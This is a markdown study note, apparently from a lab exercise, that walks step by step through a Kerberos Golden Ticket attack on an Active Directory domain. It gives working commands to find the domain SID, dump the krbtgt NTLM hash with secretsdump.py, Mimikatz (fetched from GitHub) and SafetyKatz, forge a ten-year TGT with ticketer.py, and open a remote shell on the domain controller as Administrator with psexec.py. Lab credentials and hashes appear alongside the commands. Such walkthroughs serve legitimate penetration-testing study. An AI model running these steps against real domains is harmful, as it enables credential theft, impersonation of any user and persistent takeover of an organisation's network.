#AD_golden_ticket

> KRBTGT is a service account whose hash is used to sign and encrypt Kerberos Ticket Granting Tickets (TGTs).

> A **Golden Ticket** is a fake master key that lets an attacker impersonate ANY user in a Windows domain without needing a password.

- **What it is:**  
	- A Golden Ticket is a **fake Kerberos Ticket (TGT)**.
	- It is created using the **KRBTGT account’s secret hash**, so it looks **real to the domain**.
	-  It lets an attacker **log in as any user without a password**.
- **How it works:**  
	- Normally:
	    - User sends login request (AS-REQ)
	    - Domain sends response (AS-REP)
	    - Then user gets a TGT
	- In Golden Ticket attack:
	    - This whole login step is **skipped**
	    - Attacker **creates their own TGT**
	    - Then directly requests access from services (TGS)
- **What you need to make one:**
    1. Domain name
    2. Domain SID
    3. **krbtgt account’s NTLM hash** (hardest to get)
    4. Username you want to impersonate
- **Why it’s dangerous:**
    - You can impersonate **any user** (admin, etc.)
    - You don’t even need to be on the domain network        
    - Works for **lateral movement** (jump between machines) and **persistence** (keep access even if admins reset passwords)


# **Steps 

___
# **1. Gather required information**

# **Get Domain Name**

```cmd
systeminfo
```
![[Pasted image 20260416093323.png]]
# **Get Domain SID**

#### **Method A (from compromised Windows machine):**

```bash
lookupsid.py 'Administrator:P@$$W0rd'@192.168.57.9
```

![[Pasted image 20260416093506.png]]
#### **Method A (from Linux, remote):**

or if we've already an access to machine (eg. reverse shell) we can execute `whoami /user` (excluding the last 4 chars, eg. `-500`): `S-1-5-21-1954621190-1971745961-1283776715`

```cmd
whoami /user
```
- Example:
    S-1-5-21-XXXXX-XXXXX-XXXXX-500
- Remove last part (`-500`) → that’s your **Domain SID**
![[Pasted image 20260416093356.png]]
# **Extract NTLM hash of the KRBTGT account**

We can use Impacket or Mimikatz (or a variant) on the **Domain Controller as Domain Admin**:

### **Using Impacket/secretsdump.py**

```bash
# This will Dumps all password hashes from the Domain Controller and we will use the krbtgt account hash
secretsdump.py 'Administrator:P@$$W0rd'@192.168.57.9 -outputfile krb -user-status
```
and consider the 4th part of string after the third ':'
NTLM hash of the KRBTGT account is: `d7ac4db5b820be57cc79f58f196a0e5b`
![[Pasted image 20260416094213.png]]

### Using **Mimikatz**
Download and extract Mimikatz:
```powershell
# Download and extract Mimikatz:
iwr -uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip 
Expand-Archive -Path 'mimikatz_trunk.zip' 
cd .\mimikatz_trunk\ 
cd .\x64\

# and run it:
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```
KRBTGT's NTLM: `d7ac4db5b820be57cc79f58f196a0e5b`
![[Pasted image 20260416095758.png]]

### Using SafetyKatz:
```powershell
C:\Users\Administrator\Documents\Tools\SafetyKatz.exe "lsadump::lsa /patch"
```

![[Pasted image 20260416095826.png]]

___
# **2. Forge a Golden Ticket**

#### **Create the Golden Ticket**

Forge the golden ticket using ticketer.py an impacket's script suite, its duration end after 10 yeas from the moment of creation. The command below contain all requirements needed:

- Domain name -> `dev-angelist.lab`
- Domain SID -> `S-1-5-21-1954621190-1971745961-1283776715`
- NTLM hash of the KRBTGT account -> `d7ac4db5b820be57cc79f58f196a0e5b`
- Username of user that we want to impersonate -> Administrator

```bash
# ticketer.py -nthash <HashValue> -domain-sid <SIDValue> -domain <DomainName> <Username>

ticketer.py -nthash d7ac4db5b820be57cc79f58f196a0e5b -domain-sid S-1-5-21-1954621190-1971745961-1283776715 -domain dev-angelist.lab Administrator
```

![[Pasted image 20260416093755.png]]

### **Convert Ticket Format**

The ticket is saved in Administrator.ccache, if we need to use specific tools we need to convert it to kirbi format

```bash
export KRB5CCNAME=/home/kali/Documents/AD/Administrator.ccache 

ticketConverter.py /home/kali/Documents/AD/Administrator.ccache Administrator.kirbi
```

![[Pasted image 20260416093826.png]]

In this case original .ccache format is compliant with Impacket.
### **Load Ticket into Memory**

Tells your Linux system to use this fake ticket instead of real Kerberos authentication.
**What this does:** Any Kerberos tool you run now will automatically use the forged Administrator ticket.
```bash
export KRB5CCNAME=/home/kali/Documents/AD/Administrator.ccache
```

### **Verify Ticket is Loaded**
Confirms the fake ticket is loaded and ready to use.
```bash
#If you've not installed krb5 package, install it -> sudo apt install krb5-user 
klist
```

![[Pasted image 20260416094009.png]]

###  **Sync Time with Domain Controller**
It Forces your computer's clock to match the Domain Controller's clock.
```bash
cat /etc/hosts | grep dev-angelist.lab 
sudo ntpdate -u 192.168.57.9 
```

### **Use the Ticket - Remote Access as Administrator**

```bash
# psexec.py -k -no-pass <DOMAIN_NAME>/<USER_TO_IMPERSONATE>@<DC_HOSTNAME>.<DOMAIN_NAME>

# Login as administrator user without password using the forged kerberose TGT
psexec.py -k -no-pass dev-angelist.lab/administrator@corp-dc.dev-angelist.lab
```

![[Pasted image 20260416094102.png]]
